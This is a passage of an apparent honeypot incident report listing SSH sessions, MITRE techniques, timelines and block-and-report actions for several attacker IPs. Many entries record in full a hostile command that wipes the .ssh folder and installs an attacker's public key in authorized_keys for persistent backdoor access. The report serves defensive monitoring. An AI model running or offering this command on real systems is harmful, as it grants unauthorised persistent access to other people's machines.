|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:17 |
| **Last Seen** | 2026-04-20 20:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:17:47` | `cowrie.session.connect` |
| `2026-04-20 20:17:47` | `cowrie.client.version` |
| `2026-04-20 20:17:47` | `cowrie.client.kex` |
| `2026-04-20 20:17:49` | `cowrie.login.success` |
| `2026-04-20 20:17:49` | `cowrie.session.params` |
| `2026-04-20 20:17:49` | `cowrie.command.input` |
| `2026-04-20 20:17:49` | `cowrie.command.failed` |
| `2026-04-20 20:17:50` | `cowrie.log.closed` |
| `2026-04-20 20:17:50` | `cowrie.session.params` |
| `2026-04-20 20:17:50` | `cowrie.command.input` |
| `2026-04-20 20:17:51` | `cowrie.session.file_download` |
| `2026-04-20 20:17:51` | `cowrie.log.closed` |
| `2026-04-20 20:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7492d666da6

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:17 |
| **Last Seen** | 2026-04-20 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:17:55` | `cowrie.session.connect` |
| `2026-04-20 20:17:55` | `cowrie.client.version` |
| `2026-04-20 20:17:55` | `cowrie.client.kex` |
| `2026-04-20 20:17:57` | `cowrie.login.success` |
| `2026-04-20 20:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1003fdc338e2

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:18 |
| **Last Seen** | 2026-04-20 20:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:18:25` | `cowrie.session.connect` |
| `2026-04-20 20:18:25` | `cowrie.client.version` |
| `2026-04-20 20:18:25` | `cowrie.client.kex` |
| `2026-04-20 20:18:26` | `cowrie.login.success` |
| `2026-04-20 20:18:27` | `cowrie.session.params` |
| `2026-04-20 20:18:27` | `cowrie.command.input` |
| `2026-04-20 20:18:27` | `cowrie.command.failed` |
| `2026-04-20 20:18:27` | `cowrie.log.closed` |
| `2026-04-20 20:18:28` | `cowrie.session.params` |
| `2026-04-20 20:18:28` | `cowrie.command.input` |
| `2026-04-20 20:18:28` | `cowrie.session.file_download` |
| `2026-04-20 20:18:28` | `cowrie.log.closed` |
| `2026-04-20 20:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b960500728

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:18 |
| **Last Seen** | 2026-04-20 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:18:31` | `cowrie.session.connect` |
| `2026-04-20 20:18:31` | `cowrie.client.version` |
| `2026-04-20 20:18:31` | `cowrie.client.kex` |
| `2026-04-20 20:18:32` | `cowrie.login.success` |
| `2026-04-20 20:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04bd62f03f9e

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:18 |
| **Last Seen** | 2026-04-20 20:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:18:46` | `cowrie.session.connect` |
| `2026-04-20 20:18:46` | `cowrie.client.version` |
| `2026-04-20 20:18:46` | `cowrie.client.kex` |
| `2026-04-20 20:18:47` | `cowrie.login.success` |
| `2026-04-20 20:18:47` | `cowrie.session.params` |
| `2026-04-20 20:18:47` | `cowrie.command.input` |
| `2026-04-20 20:18:47` | `cowrie.command.failed` |
| `2026-04-20 20:18:47` | `cowrie.log.closed` |
| `2026-04-20 20:18:48` | `cowrie.session.params` |
| `2026-04-20 20:18:48` | `cowrie.command.input` |
| `2026-04-20 20:18:48` | `cowrie.session.file_download` |
| `2026-04-20 20:18:48` | `cowrie.log.closed` |
| `2026-04-20 20:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5bc743a176b

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:18 |
| **Last Seen** | 2026-04-20 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:18:50` | `cowrie.session.connect` |
| `2026-04-20 20:18:50` | `cowrie.client.version` |
| `2026-04-20 20:18:50` | `cowrie.client.kex` |
| `2026-04-20 20:18:50` | `cowrie.login.success` |
| `2026-04-20 20:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf708ce8ac8

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:19 |
| **Last Seen** | 2026-04-20 20:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:19:30` | `cowrie.session.connect` |
| `2026-04-20 20:19:30` | `cowrie.client.version` |
| `2026-04-20 20:19:31` | `cowrie.client.kex` |
| `2026-04-20 20:19:32` | `cowrie.login.success` |
| `2026-04-20 20:19:33` | `cowrie.session.params` |
| `2026-04-20 20:19:33` | `cowrie.command.input` |
| `2026-04-20 20:19:33` | `cowrie.command.failed` |
| `2026-04-20 20:19:33` | `cowrie.log.closed` |
| `2026-04-20 20:19:34` | `cowrie.session.params` |
| `2026-04-20 20:19:34` | `cowrie.command.input` |
| `2026-04-20 20:19:35` | `cowrie.session.file_download` |
| `2026-04-20 20:19:35` | `cowrie.log.closed` |
| `2026-04-20 20:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2094c57ce22

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:19 |
| **Last Seen** | 2026-04-20 20:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:19:39` | `cowrie.session.connect` |
| `2026-04-20 20:19:39` | `cowrie.client.version` |
| `2026-04-20 20:19:39` | `cowrie.client.kex` |
| `2026-04-20 20:19:40` | `cowrie.login.success` |
| `2026-04-20 20:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1690a9912999

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:21 |
| **Last Seen** | 2026-04-20 20:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:21:19` | `cowrie.session.connect` |
| `2026-04-20 20:21:19` | `cowrie.client.version` |
| `2026-04-20 20:21:20` | `cowrie.client.kex` |
| `2026-04-20 20:21:21` | `cowrie.login.success` |
| `2026-04-20 20:21:22` | `cowrie.session.params` |
| `2026-04-20 20:21:22` | `cowrie.command.input` |
| `2026-04-20 20:21:22` | `cowrie.command.failed` |
| `2026-04-20 20:21:22` | `cowrie.log.closed` |
| `2026-04-20 20:21:23` | `cowrie.session.params` |
| `2026-04-20 20:21:23` | `cowrie.command.input` |
| `2026-04-20 20:21:23` | `cowrie.session.file_download` |
| `2026-04-20 20:21:23` | `cowrie.log.closed` |
| `2026-04-20 20:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3752a4f774ec

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:21 |
| **Last Seen** | 2026-04-20 20:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:21:27` | `cowrie.session.connect` |
| `2026-04-20 20:21:27` | `cowrie.client.version` |
| `2026-04-20 20:21:27` | `cowrie.client.kex` |
| `2026-04-20 20:21:29` | `cowrie.login.success` |
| `2026-04-20 20:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e583d7f0aa2b

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:21 |
| **Last Seen** | 2026-04-20 20:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:21:46` | `cowrie.session.connect` |
| `2026-04-20 20:21:46` | `cowrie.client.version` |
| `2026-04-20 20:21:46` | `cowrie.client.kex` |
| `2026-04-20 20:21:46` | `cowrie.login.success` |
| `2026-04-20 20:21:47` | `cowrie.session.params` |
| `2026-04-20 20:21:47` | `cowrie.command.input` |
| `2026-04-20 20:21:47` | `cowrie.command.failed` |
| `2026-04-20 20:21:47` | `cowrie.log.closed` |
| `2026-04-20 20:21:47` | `cowrie.session.params` |
| `2026-04-20 20:21:47` | `cowrie.command.input` |
| `2026-04-20 20:21:47` | `cowrie.session.file_download` |
| `2026-04-20 20:21:47` | `cowrie.log.closed` |
| `2026-04-20 20:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e39747b021

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:21 |
| **Last Seen** | 2026-04-20 20:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:21:49` | `cowrie.session.connect` |
| `2026-04-20 20:21:49` | `cowrie.client.version` |
| `2026-04-20 20:21:49` | `cowrie.client.kex` |
| `2026-04-20 20:21:50` | `cowrie.login.success` |
| `2026-04-20 20:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd06cd62410

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:22 |
| **Last Seen** | 2026-04-20 20:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:22:42` | `cowrie.session.connect` |
| `2026-04-20 20:22:42` | `cowrie.client.version` |
| `2026-04-20 20:22:42` | `cowrie.client.kex` |
| `2026-04-20 20:22:43` | `cowrie.login.success` |
| `2026-04-20 20:22:43` | `cowrie.session.params` |
| `2026-04-20 20:22:43` | `cowrie.command.input` |
| `2026-04-20 20:22:43` | `cowrie.command.failed` |
| `2026-04-20 20:22:43` | `cowrie.log.closed` |
| `2026-04-20 20:22:43` | `cowrie.session.params` |
| `2026-04-20 20:22:43` | `cowrie.command.input` |
| `2026-04-20 20:22:43` | `cowrie.session.file_download` |
| `2026-04-20 20:22:43` | `cowrie.log.closed` |
| `2026-04-20 20:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2edc6768e2f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:22 |
| **Last Seen** | 2026-04-20 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:22:46` | `cowrie.session.connect` |
| `2026-04-20 20:22:46` | `cowrie.client.version` |
| `2026-04-20 20:22:46` | `cowrie.client.kex` |
| `2026-04-20 20:22:47` | `cowrie.login.success` |
| `2026-04-20 20:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7093d504464

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:22 |
| **Last Seen** | 2026-04-20 20:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:22:57` | `cowrie.session.connect` |
| `2026-04-20 20:22:57` | `cowrie.client.version` |
| `2026-04-20 20:22:58` | `cowrie.client.kex` |
| `2026-04-20 20:22:59` | `cowrie.login.success` |
| `2026-04-20 20:22:59` | `cowrie.session.params` |
| `2026-04-20 20:22:59` | `cowrie.command.input` |
| `2026-04-20 20:22:59` | `cowrie.command.failed` |
| `2026-04-20 20:22:59` | `cowrie.log.closed` |
| `2026-04-20 20:23:00` | `cowrie.session.params` |
| `2026-04-20 20:23:00` | `cowrie.command.input` |
| `2026-04-20 20:23:00` | `cowrie.session.file_download` |
| `2026-04-20 20:23:00` | `cowrie.log.closed` |
| `2026-04-20 20:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f939deb18d32

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:23 |
| **Last Seen** | 2026-04-20 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:23:03` | `cowrie.session.connect` |
| `2026-04-20 20:23:03` | `cowrie.client.version` |
| `2026-04-20 20:23:03` | `cowrie.client.kex` |
| `2026-04-20 20:23:04` | `cowrie.login.success` |
| `2026-04-20 20:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94f0f5bf061

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:24 |
| **Last Seen** | 2026-04-20 20:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:24:43` | `cowrie.session.connect` |
| `2026-04-20 20:24:43` | `cowrie.client.version` |
